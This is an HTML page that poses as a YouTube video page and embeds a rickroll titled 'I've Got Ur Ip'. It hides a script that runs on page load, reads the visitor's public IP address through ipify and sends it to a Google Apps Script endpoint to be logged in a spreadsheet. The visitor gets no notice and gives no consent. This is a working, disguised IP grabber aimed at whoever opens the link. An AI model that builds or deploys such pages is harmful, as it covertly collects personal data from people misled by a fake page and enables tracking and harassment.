<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Youtube</title>
    <link rel="icon" type="image/png" href="https://www.youtube.com/s/desktop/ba56c95d/img/logos/favicon_32x32.png">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
        }

        /* YouTube-like video player */
        .video-container {
            width: 100%;
            max-width: 960px;
            margin: 20px auto;
            background: #000;
            position: relative;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.2);
        }

        .video-container iframe {
            width: 100%;
            height: 540px;
        }

        .video-details {
            padding: 20px;
            background-color: #fff;
            display: flex;
            flex-direction: column;
        }

        .video-details h1 {
            font-size: 24px;
            margin: 0;
        }

        .video-details p {
            margin-top: 10px;
            font-size: 16px;
            color: #555;
        }

        .video-details .stats {
            display: flex;
            margin-top: 10px;
        }

        .stats span {
            margin-right: 20px;
            color: #555;
            font-size: 14px;
        }

        /* Footer */
        .footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 10px 0;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<!-- Video container -->
<div class="video-container">
    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allowfullscreen></iframe>
    <div class="video-details">
        <h1>I've Got Ur Ip</h1>
        <p>HaHa L+Ratio</p>
        <div class="stats">
            <span>1,629,817,129 views</span>
            <span>18m likes</span>
        </div>
    </div>
</div>

<!-- Footer -->
<div class="footer">
    <p>Â© 2025 Camdyn Can Code</p>
</div>

<script>
    // Replace this with the URL from your Google Apps Script deployment
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwVurAyKZJLicUK32HGl_Wb1LXauEumtG7dD4Ixf7FNoXaBBBefa4Wgvv-VaD9NyV14/exec';

    // Log visitor IP to Google Sheets
    fetch('https://api4.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            fetch(`${GOOGLE_SCRIPT_URL}?ip=${data.ip}`)
                .then(response => response.text())
                .then(console.log); // Optional: You can log or show response here
        })
        .catch(error => console.error("Error logging IP:", error));
    
</script>

</body>
</html>
